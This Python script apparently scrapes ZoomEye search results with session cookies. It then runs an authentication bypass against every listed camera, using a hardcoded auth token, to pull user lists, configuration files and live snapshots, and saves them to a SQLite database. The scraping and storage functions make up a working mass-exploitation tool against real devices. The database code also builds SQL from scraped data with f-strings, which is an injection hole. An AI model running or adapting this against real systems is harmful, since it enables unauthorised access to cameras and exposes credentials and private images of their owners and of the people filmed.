# _*_ codign:utf8 _*_
"""====================================
@Author:Sadam·Sadik
@Email：1903249375@qq.com
@Date：2022/7/28
@Software: PyCharm
@disc:
======================================="""
import csv
import datetime
import http.client
import math
import sqlite3
import threading
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

import requests
import urllib3.exceptions
from requests import ConnectTimeout

from utils import colorPrint

deviceQueue = Queue()


def save():
    conn = sqlite3.connect("/Users/shadikesadamu/Projects/izbasar/django-admin/AllKeeper.db")
    cursor = conn.cursor()
    while True:
        createdAt = datetime.datetime.now()
        updatedAt = datetime.datetime.now()
        device: dict = deviceQueue.get()
        ip = device.get('ip')
        scannedAt: str = device.get("timestamp")
        deviceType: str = device.get("type")
        mappingType: str = device.get("mapping-type")
        token: str = device.get("token")
        scannable: bool = device.get("scannable")
        deviceOS: str = device.get("os")
        honeypot = device.get("honeypot")
        sensitive: bool = device.get("sensitive_data")
        ipMalware = device.get("ip_malware")
        txtFile: str = device.get("txtfile")
        ico: str = device.get("ico")
        jarm: str = device.get("jarm")
        ssl: str = device.get("ssl")
        geoInfo: dict = device.get("geoinfo")
        # TODO:这里还得解析geoinfo剩下的部分字段
        country: dict = geoInfo.get("country")
        base_station: str = geoInfo.get("base_station")
        city: dict = geoInfo.get("city")
        isp: str = geoInfo.get("isp")
        idc: str = geoInfo.get("idc")
        asn: str = geoInfo.get('asn')
        org: str = geoInfo.get('organization')
        subdivision: dict = geoInfo.get("subdivisions")

        portInfo: dict = device.get('portinfo')
        hostname: str = portInfo.get("hostname")
        product: str = portInfo.get("product")
        portOS: str = portInfo.get("os")
        port: int = portInfo.get("port")
        service: str = portInfo.get("service")
        transport: str = portInfo.get("transport")
        rawData: str = device.get("raw_data")
        rhtml: str = device.get("rhtml")

        # TODO：解析跟WebCam有关的特殊字段
        usersXml = portInfo.get("usersXml")
        conf = portInfo.get("conf")
        snapshot = portInfo.get("snapshot")
        try:
            countryCode = country.get("code")
            countryNames = country.get("names")
            countryNameEn = countryNames.get("en")
            countryNameCn = countryNames.get("cn")
            sqlCountry = f"INSERT INTO accountSystem_country (createdAt,updatedAt,code,nameEn,nameCn) VALUES ('{createdAt}','{updatedAt}','{countryCode}','{countryNameEn}','{countryNameCn}')"
            cursor.execute(sqlCountry)
            conn.commit()
        except sqlite3.IntegrityError:
            pass
        except Exception as e:
            colorPrint.purple("CREATE COUNTRY ERROR:" + str(e))

        try:
            cityNames = city.get("names")
            cityNameEn = cityNames.get("en")
            cityNameCn = cityNames.get("cn")
            sqlCity = f"INSERT INTO accountSystem_city (createdAt,updatedAt,nameEn,nameCn) VALUES ('{createdAt}','{updatedAt}','{cityNameEn}','{cityNameCn}')"
            cursor.execute(sqlCity)
            conn.commit()
        except Exception as e:
            colorPrint.purple("CREATE CITY ERROR:" + str(e))
        try:
            sql = f"INSERT INTO accountSystem_device (ip,port,createdAt,updatedAt,asn,org) VALUES ('{ip}','{port}','{createdAt}','{updatedAt}','{asn}','{org}')"
            cursor.execute(sql)
            conn.commit()
        except sqlite3.IntegrityError as e:
            try:
                sql1 = f"UPDATE accountSystem_device SET port='{port}',updatedAt='{updatedAt}',asn='{asn}',org='{org}' WHERE ip='{ip}'"
                cursor.execute(sql1)
                conn.commit()
            except sqlite3.Error as e:
                print("UPDATE ERROR:", e)
        except sqlite3.Error as e:
            print("CREATE ERROR:", e)


def handle(match: dict):
    ip = match.get("ip")
    portInfo = match.get("portinfo")
    port = portInfo.get("port")
    target = f"{ip}:{port}"
    securityUsersURL = f"http://{target}/Security/users?auth=YWRtaW46MTEK"

    portInfo.setdefault("usersXml", None)
    portInfo.setdefault("conf", None)
    portInfo.setdefault("snapshot", None)
    try:
        resp = requests.get(url=securityUsersURL)
        if resp.status_code == 200:
            portInfo.setdefault("usersXml", resp.text)
            resp1 = requests.get(f"http://{target}/System/configurationFile?auth=YWRtaW46MTEK")
            if resp1.status_code == 200:
                portInfo.setdefault("conf", resp1.text)
                imageUrl = f"http://{target}/onvif-http/snapshot?auth=YWRtaW46MTEK"
                resp2 = requests.get(url=imageUrl, timeout=5 * 60)
                if resp2.status_code == 200:
                    portInfo.setdefault("snapshot", resp2.content)
                    colorPrint.green(f"{target} OK {imageUrl}")
                else:
                    colorPrint.blue(f"{target} OK {securityUsersURL}")
            else:
                colorPrint.red(f"{target} ERROR ON SECOND STEP.")
        else:
            colorPrint.red(f"{target} ERROR")
    except ConnectTimeout:
        colorPrint.red(f"{target} TimeOut")
    except urllib3.exceptions.ProtocolError as e:
        colorPrint.yellow(f"{target} ProtocolError")
    except requests.exceptions.ConnectionError as e:
        colorPrint.red(f"{target} ConnectionError.")
    except http.client.RemoteDisconnected as e:
        colorPrint.red(f"{target} RemoteDisconnected.")
    deviceQueue.put(match)


def get(cubeAuthorizationToken: str, cookie_jsluid_s: str,
        cookie_SECKEY_ABVK: str,
        cookie_BMAP_SECKEY: str, q: str = "", page: int = 1, pageSize: int = 20):
    resp = requests.get(url="https://www.zoomeye.org/search", params={
        "q": q,
        "page": page,
        "pageSize": pageSize,
        "t": "v4+v6+web"
    }, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Cube-Authorization": cubeAuthorizationToken,
        "Connection": "keep-alive",
        "Referer": "https://www.zoomeye.org/searchResult?q=%22Last-Modified%3A%20Tue%2C%2017%20May%202016%2010%3A22%3A58%20GMT%22%20%22Last-Modified%3A%20Thu%2C%2024%20Mar%202016%2005%3A58%3A21%20GMT%22%20%22Last-Modified%3A%20Thu%2C%2019%20Mar%202015%2009%3A24%3A20%20GMT%22%20%2Bcountry%3A%22US%22&page=11&pageSize=20",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }, cookies={
        "__jsluid_s": cookie_jsluid_s,
        "SECKEY_ABVK": cookie_SECKEY_ABVK,
        "BMAP_SECKEY": cookie_BMAP_SECKEY,
    })
    resp_json = resp.json()
    matches: list[dict] = resp_json.get("matches")
    for match in matches:
        threading.Thread(target=handle, args=(match,)).start()
        # handle(match)
    # handle(matches[0])


def scan(
        cubeAuthorizationToken: str,
        cookie_jsluid_s: str,
        cookie_SECKEY_ABVK: str,
        cookie_BMAP_SECKEY: str,
        q: str = "", pageSize: int = 20, maxCount: int = 400
):
    threading.Thread(target=save).start()
    pool = ThreadPoolExecutor(max_workers=1)
    for p in range(1, math.ceil(maxCount / pageSize)):
        pool.submit(get, cubeAuthorizationToken, cookie_jsluid_s, cookie_SECKEY_ABVK, cookie_BMAP_SECKEY, q, p,
                    pageSize, )


def test():
    cr = csv.reader(open("./targets/glory.csv", encoding="utf-8", mode="r"))
    header = next(cr)
    for row in cr:
        ip = row[0]
        port = row[1]
        if port == "":
            port = 80
        target = f"{ip}:{port}"
        resp = requests.get(url=f"http://{target}/Security/users?auth=YWRtaW46MTEK")
        if resp.status_code == 200:
            with open(f"./targets/Security-users/{ip}-{port}.xml", "wb") as f:
                f.write(resp.content)
                print(target, "ok")
        else:
            print(target, "ERROR")
